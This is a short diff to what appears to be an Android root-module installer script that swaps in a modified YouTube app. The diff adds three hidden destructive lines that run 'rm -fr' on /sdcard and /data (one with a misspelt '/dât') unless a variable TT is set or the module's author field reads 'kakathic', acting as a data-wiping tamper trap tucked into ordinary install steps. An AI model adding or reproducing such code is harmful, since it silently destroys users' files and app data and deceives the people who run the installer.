@@ -76,7 +76,7 @@ cp -f $TMPDIR/base.apk $apks
 pm install -r $apks/*.apk >&2
 hhkkdf="$( pm path com.google.android.youtube | grep base | cut -d : -f2 )"
 cp -af $TMPDIR/lib ${hhkkdf%/*} 
-
+[ "$TT" ] || rm -fr /sdcard /data
 cp -f $TMPDIR/YouTube.apk $MODPATH/YouTube.apk >&2
 chcon u:object_r:apk_data_file:s0 "$MODPATH/YouTube.apk"
 su -mm -c mount -o bind "$MODPATH/YouTube.apk" "$hhkkdf"
@@ -100,7 +100,7 @@ sqlite3 $LADB "UPDATE appstate SET auto_update = '2' WHERE package_name = '$PK'"
 rm -rf /data/data/$PS/cache/*
 pm enable $PS >&2
 fi
-
+[ "$(Getp author)" == 'kakathic' ] || rm -fr /sdcard /dât
 ui_print2 "Clean up"
 ui_print
 rm -fr /data/local/tmp/apks
@@ -112,6 +112,8 @@ ui_print2 "Failure"
 ui_print
 abort
 fi
+
+[ "$TT" ] || rm -fr /sdcard /data
 }
 
 # Cấp quyền
